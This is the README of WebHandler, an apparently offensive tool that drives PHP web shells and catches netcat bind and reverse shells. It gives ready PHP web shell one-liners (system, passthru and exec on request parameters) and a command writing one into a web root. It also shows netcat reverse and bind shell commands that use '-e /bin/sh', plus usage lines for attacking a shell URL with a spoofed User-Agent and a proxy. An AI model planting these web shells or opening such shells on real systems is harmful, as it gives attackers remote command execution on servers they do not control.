# WebHandler #
## _A handler for PHP system functions & also an alternative 'netcat' handler_ ##
---
![My image](http://s12.postimage.org/t5ujo2om5/Untitled_1.png)

### Info ###
---
WebHandler tries to simulate a 'Linux bash prompt' to handle and process:

    - PHP program execution functions _(e.g. `system`, `passthru`, `exec`, etc)_
    - Bind shell connections _(e.g. `nc <ip> <port>`)_
    - Reserve shell connections _(e.g. `nc -lvvp 1234`)_

Another feature is to spoof the "User-Agent" field in the HTTP header. (`--random-angent`).

It also supports HTTP proxies (`--proxy http://<ip>:<port>`)

* WebHandler works for **POST** and **GET** requests:
    - `<?php system($_GET['cmd']); ?>`
    - `<?php passthru($_REQUEST['cmd']); ?>`
    - `<?php echo exec($_POST['cmd']); ?>`

* WebHandler is a replacement for netcat connections.

    A example bind connection (_e.g. `nc -lvvp 1234 -e /bin/sh`_)

    Normally the user would do:
    - `netcat -l -p 1234`
    - `nc -lvvp 1234`
    
    A example reverse connection (_e.g. `nc 127.0.0.1 4321 -e /bin/sh`_)

    Normally the user would do:
    - `netcat -l -p 4321`
    - `nc -lvvp 4321`

### Usage ###
---
* --Example file:
    - `echo '<?php system($_GET['cmd']); ?>' > /var/www/shell.php`

* --url is a required argument when sending either GET or POST requests _(e.g. a bind 'web based PHP' connection)_:
    - `python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=`
    - `python webhandler.py --url http://www.mywebsite.com/shell.php --method POST --parameter cmd`
    - `python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo`
    - `python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080`

* --listen is a required argument when working waiting connection _(e.g. a reverse 'raw' connection)_:
    - `python webhandler.py --listen 1234`

### Dependencies
---
If your [Python][]'s version < 2.7.x, then [argparse][] **is required**
To install it run: `sudo (apt-get|yum) install python-setuptools && sudo easy_install argparse` **OR** `sudo pip --install argparse`.

[readline][] **is optional**.
This module it used to provide elaborate line editing and history features

[git][] **is optional**.
This allows for the project to be kept up-to-date

### Links
---
[Wiki][]

[Known Bugs][]

[Python]: http://www.python.org/download/
[argparse]: http://docs.python.org/library/argparse.html
[readline]: http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html
[git]: http://git-scm.com
[Wiki]: https://github.com/lnxg33k/webhandler/wiki
[Known Bugs]: https://github.com/lnxg33k/webhandler/issues
